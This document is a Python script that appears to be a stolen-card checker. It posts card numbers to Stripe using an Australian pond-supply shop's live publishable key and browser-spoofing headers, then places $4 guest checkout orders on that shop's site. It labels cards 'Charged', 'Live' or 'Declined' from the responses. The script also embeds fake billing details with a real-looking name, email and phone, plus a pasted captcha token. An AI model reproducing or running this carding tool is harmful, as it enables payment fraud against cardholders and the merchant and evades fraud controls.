"""
Stripe $4 V2 Gateway (Living Ponds)
Based on Stripe4$.py
"""

import requests
import uuid
import time
from urllib.parse import urlencode

def check_card(card_details):
    """
    Check card using Stripe $4 V2 gateway
    
    Args:
        card_details: dict with number, exp_month, exp_year, cvc
        
    Returns:
        dict: {status, message, response_time}
    """
    
    start_time = time.time()
    
    try:
        # Step 1: Create Stripe Payment Method
        stripe_url = 'https://api.stripe.com/v1/payment_methods'
        
        stripe_headers = {
            'accept': 'application/json',
            'accept-language': 'en-GB',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }

        stripe_data = {
            'billing_details[address][state]': 'SA',
            'billing_details[address][postal_code]': '1234',
            'billing_details[address][country]': 'AU',
            'billing_details[address][city]': 'Hivug',
            'billing_details[address][line1]': 'New',
            'billing_details[address][line2]': 'York',
            'billing_details[email]': 'khatrieex@gmail.com',
            'billing_details[name]': 'Diwas Khatri',
            'billing_details[phone]': '875444',
            'type': 'card',
            'allow_redisplay': 'unspecified',
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/c264a67020; stripe-js-v3/c264a67020; payment-element; deferred-intent; autopm',
            'referrer': 'https://www.livingponds.com.au',
            'time_on_page': '150658',
            'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
            'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'key': 'pk_live_51QBpW3CSUyWFRv1F1BlrlZOjar9z8cVx4CzPIpEqe1P6vQGvBD5BwSwm998v51I7xVMj3G7YzMKiOwNfYCxw0wCq00xySSFhML',
            '_stripe_version': '2020-03-02',
            'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...',
            'card[number]': card_details['number'],
            'card[cvc]': card_details['cvc'],
            'card[exp_year]': card_details['exp_year'],
            'card[exp_month]': card_details['exp_month'],
            'guid': str(uuid.uuid4()),
            'muid': str(uuid.uuid4()),
            'sid': str(uuid.uuid4()),
        }
        
        encoded_data = urlencode(stripe_data)

        response = requests.post(stripe_url, headers=stripe_headers, data=encoded_data, timeout=30)
        
        if response.status_code != 200:
            return {
                'status': 'Declined',
                'message': 'Failed to create payment method',
                'response_time': round(time.time() - start_time, 2)
            }
        
        payment_method_id = response.json().get('id')
        
        if not payment_method_id:
            return {
                'status': 'Declined',
                'message': 'Invalid card details',
                'response_time': round(time.time() - start_time, 2)
            }
        
        # Step 2: Place order
        cart_id = 'NbH2uDAvDyurRfoXVQ1PFTCvsSEHTA3J'
        order_url = f'https://www.livingponds.com.au/rest/default/V1/guest-carts/{cart_id}/payment-information'
        
        merchant_headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://www.livingponds.com.au',
            'referer': 'https://www.livingponds.com.au/checkout/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        merchant_json = {
            'cartId': cart_id,
            'billingAddress': {
                'countryId': 'AU',
                'regionId': '609',
                'street': ['New', 'York'],
                'telephone': '875444',
                'postcode': '1234',
                'city': 'Hivug',
                'firstname': 'Diwas',
                'lastname': 'Khatri'
            },
            'paymentMethod': {
                'method': 'stripe_payments',
                'additional_data': {
                    'payment_method': payment_method_id
                }
            },
            'email': 'khatrieex@gmail.com',
        }

        response = requests.post(order_url, headers=merchant_headers, json=merchant_json, timeout=30)
        
        response_time = round(time.time() - start_time, 2)
        
        if response.status_code == 200:
            return {
                'status': 'Charged',
                'message': 'Payment Successful ($4 Charged)',
                'response_time': response_time
            }
        else:
            error_text = response.text.lower()
            
            if 'insufficient' in error_text:
                return {
                    'status': 'Approved',
                    'message': 'Card is Live (Insufficient Funds)',
                    'response_time': response_time
                }
            elif 'declined' in error_text or 'invalid' in error_text:
                return {
                    'status': 'Declined',
                    'message': 'Card Declined',
                    'response_time': response_time
                }
            else:
                return {
                    'status': 'Declined',
                    'message': response.text[:100],
                    'response_time': response_time
                }
            
    except requests.exceptions.Timeout:
        return {
            'status': 'Declined',
            'message': 'Request timeout',
            'response_time': round(time.time() - start_time, 2)
        }
    except Exception as e:
        return {
            'status': 'Declined',
            'message': f'Error: {str(e)}',
            'response_time': round(time.time() - start_time, 2)
        }


# Test
if __name__ == '__main__':
    test_card = {
        'number': '4532123456789012',
        'exp_month': '12',
        'exp_year': '2025',
        'cvc': '123'
    }
    
    result = check_card(test_card)
    print(f"Result: {result}")
